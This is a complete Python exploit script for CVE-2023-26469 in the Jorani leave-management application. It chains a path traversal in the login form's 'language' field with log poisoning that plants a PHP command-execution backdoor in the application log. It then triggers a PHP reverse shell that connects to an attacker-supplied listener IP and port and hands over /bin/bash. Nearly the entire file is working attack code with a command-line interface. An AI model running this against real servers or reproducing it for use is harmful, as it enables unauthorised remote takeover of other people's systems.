#!/usr/bin/env python3
"""
Jorani Path Traversal & RCE Exploit (CVE-2023-26469)
Author: Samip Mainali
Original Research: Guilhem RIOUX (@jrjgjk)
"""

import sys
import re
import time
import base64
import random
import argparse
import requests
from datetime import datetime
from urllib.parse import urlparse

class ExploitConfig:
    """Runtime configuration constants"""
    CSRF_PATTERN = re.compile(r'name="csrf_test_jorani" value="([a-f0-9]{32})"')
    USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    LOG_PREFIX = "log-"
    COLORS = {
        "RED": "\033[91m",
        "GREEN": "\033[92m",
        "YELLOW": "\033[93m",
        "BLUE": "\033[94m",
        "MAGENTA": "\033[95m",
        "CYAN": "\033[96m",
        "RESET": "\033[0m",
        "BOLD": "\033[1m"
    }
    BANNER = COLORS['RED'] + r"""
     ██╗ ██████╗ ██████╗  █████╗ ███╗   ██╗██╗
     ██║██╔═══██╗██╔══██╗██╔══██╗████╗  ██║██║
     ██║██║   ██║██████╔╝███████║██╔██╗ ██║██║
██   ██║██║   ██║██╔══██╗██╔══██║██║╚██╗██║██║
╚█████╔╝╚██████╔╝██║  ██║██║  ██║██║ ╚████║██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝
    """ + COLORS['RESET']

class JoraniExploit:
    """Main exploit controller class"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": ExploitConfig.USER_AGENT})
        self.injection_header = self._generate_header()
        self.target_base = None

    class ExploitError(Exception):
        """Custom exception for exploit failures"""
        pass

    @staticmethod
    def _generate_header(length=14):
        """Generate random injection header name"""
        return ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(length))

    def _print_banner(self):
        """Display tool branding"""
        print(ExploitConfig.BANNER)
        print(f"{ExploitConfig.COLORS['YELLOW']}[ CVE-2023-26469 - Jorani <=1.0.0 RCE Exploit ]")
        print(f"{ExploitConfig.COLORS['CYAN']}Credits: @jrjgjk | Modified by: Samip Mainali{ExploitConfig.COLORS['RESET']}\n")

    def _validate_connection(self, url):
        """Validate target connectivity with protocol detection"""
        parsed = urlparse(url)
        protocol = parsed.scheme
        port = parsed.port or (443 if protocol == 'https' else 80)
        target = parsed.netloc.split(':')[0]

        # Test basic connectivity
        try:
            test_url = f"{protocol}://{target}:{port}/session/login"
            self.session.head(test_url, timeout=5, verify=False)
            return f"{protocol}://{target}:{port}" if parsed.port else f"{protocol}://{target}"
        except requests.ConnectionError as e:
            error_msg = [
                f"{ExploitConfig.COLORS['RED']}Connection failed to {protocol.upper()}://{target}:{port}{ExploitConfig.COLORS['RESET']}",
                f"{ExploitConfig.COLORS['YELLOW']}Possible solutions:{ExploitConfig.COLORS['RESET']}",
                "1. Verify target is running and accessible",
                "2. Check firewall/network configuration",
                "3. Try different protocol (http/https)",
                "4. Confirm correct port number"
            ]
            
            if 'Connection refused' in str(e):
                error_msg.insert(1, f"{ExploitConfig.COLORS['RED']}Server actively refused connection{ExploitConfig.COLORS['RESET']}")
                if protocol == 'https':
                    error_msg.append(f"{ExploitConfig.COLORS['CYAN']}Tip: Target might not have SSL configured - try HTTP{ExploitConfig.COLORS['RESET']}")
                else:
                    error_msg.append(f"{ExploitConfig.COLORS['CYAN']}Tip: Target might require HTTPS - try SSL connection{ExploitConfig.COLORS['RESET']}")

            raise self.ExploitError('\n'.join(error_msg))

    def _handle_protocol(self, url_input):
        """Interactive protocol handling with validation"""
        parsed = urlparse(url_input)
        if parsed.scheme:
            return self._validate_connection(url_input)
            
        # Protocol missing - interactive selection
        while True:
            protocol = input(
                f"{ExploitConfig.COLORS['CYAN']}"
                "[?] Protocol missing. Use http/https? [http]: "
                f"{ExploitConfig.COLORS['RESET']}"
            ).strip().lower() or 'http'

            if protocol not in ('http', 'https'):
                print(f"{ExploitConfig.COLORS['RED']}Invalid protocol, must be http/https{ExploitConfig.COLORS['RESET']}")
                continue

            test_url = f"{protocol}://{url_input}"
            try:
                return self._validate_connection(test_url)
            except self.ExploitError as e:
                print(f"\n{ExploitConfig.COLORS['RED']}Connection attempt failed:{ExploitConfig.COLORS['RESET']}")
                print(str(e))
                if protocol == 'https':
                    switch = input(f"{ExploitConfig.COLORS['CYAN']}Try HTTP instead? [y/N]: {ExploitConfig.COLORS['RESET']}").lower()
                    if switch == 'y':
                        return self._validate_connection(f"http://{url_input}")
                sys.exit(1)

    def _send_request(self, method, path, **kwargs):
        """Handle HTTP requests with error checking"""
        url = f"{self.target_base}{path}"
        try:
            resp = self.session.request(
                method,
                url,
                verify=False,
                **kwargs
            )
            resp.raise_for_status()
            return resp
        except requests.RequestException as e:
            raise self.ExploitError(f"{ExploitConfig.COLORS['RED']}HTTP Error: {str(e)}{ExploitConfig.COLORS['RESET']}")

    def _extract_csrf(self, response_text):
        """Retrieve CSRF token from HTML"""
        match = ExploitConfig.CSRF_PATTERN.search(response_text)
        if not match:
            raise self.ExploitError("CSRF token extraction failed")
        return match.group(1)

    def _poison_logs(self):
        """Inject PHP backdoor into application logs"""
        login_page = "/session/login"
        
        resp = self._send_request('GET', login_page)
        csrf_token = self._extract_csrf(resp.text)
        log_date = datetime.strptime(resp.headers['Date'], '%a, %d %b %Y %H:%M:%S GMT')
        log_file = f"{ExploitConfig.LOG_PREFIX}{log_date.strftime('%Y-%m-%d')}"

        payload = {
            'csrf_test_jorani': csrf_token,
            'last_page': 'session/login',
            'language': '../../application/logs',
            'login': f'<?php if(isset($_SERVER["HTTP_{self.injection_header}"]))'
                     f'{{system(base64_decode($_SERVER["HTTP_{self.injection_header}"]));}} ?>',
            'CipheredValue': 'ExploitPassword'
        }

        self._send_request('POST', login_page, data=payload)
        return log_file

    def _trigger_shell(self, lhost, lport, log_file):
        """Execute reverse shell payload with proper success detection"""
        payload = f"php -r '$s=fsockopen(\"{lhost}\",{lport});system(\"/bin/bash <&3 >&3 2>&3\");'"
        headers = {
            "X-Requested-With": "XMLHttpRequest",
            self.injection_header: base64.b64encode(payload.encode()).decode()
        }

        try:
            print(f"{ExploitConfig.COLORS['YELLOW']}[~] Triggering exploit...{ExploitConfig.COLORS['RESET']}")
            self.session.get(
                f"{self.target_base}/pages/view/{log_file}",
                headers=headers,
                verify=False,
                timeout=2
            )
            raise self.ExploitError(
                f"{ExploitConfig.COLORS['RED']}Reverse shell failed!{ExploitConfig.COLORS['RESET']}\n"
                f"{ExploitConfig.COLORS['YELLOW']}Possible reasons:{ExploitConfig.COLORS['RESET']}\n"
                "1. Listener not running\n2. Firewall blocking\n3. Invalid target/port"
            )

        except requests.Timeout:
            print(f"{ExploitConfig.COLORS['GREEN']}[+] Reverse shell connection established!{ExploitConfig.COLORS['RESET']}")
            print(f"{ExploitConfig.COLORS['BLUE']}[*] Waiting 5 seconds to confirm stability...{ExploitConfig.COLORS['RESET']}")
            time.sleep(5)
            print(f"{ExploitConfig.COLORS['GREEN']}[+] Exploit completed successfully!{ExploitConfig.COLORS['RESET']}")
            print(f"{ExploitConfig.COLORS['MAGENTA']}[+] Check your listener for the shell!{ExploitConfig.COLORS['RESET']}")

    def execute(self, args):
        """Main exploit workflow"""
        self._print_banner()
        
        try:
            # Validate and configure target
            self.target_base = self._handle_protocol(args.url.rstrip('/'))
            
            print(f"{ExploitConfig.COLORS['CYAN']}[~] Poisoning application logs...{ExploitConfig.COLORS['RESET']}")
            log_file = self._poison_logs()
            
            self._trigger_shell(args.ip, args.port, log_file)
            
        except self.ExploitError as e:
            print(f"\n{ExploitConfig.COLORS['RED']}[!] EXPLOIT FAILED{ExploitConfig.COLORS['RESET']}")
            print(f"{str(e)}\n")
            sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g. http://vulnerable.com)")
    parser.add_argument("-i", "--ip", required=True, help="Listener IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Listener port")
    
    exploit = JoraniExploit()
    exploit.execute(parser.parse_args())
